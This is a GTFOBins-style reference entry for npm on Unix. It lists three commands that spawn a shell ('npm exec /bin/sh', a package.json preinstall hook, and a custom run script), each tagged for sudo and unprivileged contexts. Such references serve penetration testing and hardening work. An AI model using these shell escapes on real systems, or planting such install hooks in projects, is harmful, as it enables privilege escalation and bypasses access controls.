---
type: gtfobin
name: npm
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# npm

## shell

```bash
npm exec /bin/sh
```
**Contexts:** sudo, unprivileged

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
npm -C . i
```
**Contexts:** sudo, unprivileged

```bash
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
npm -C . run xxx
```
**Contexts:** sudo, unprivileged
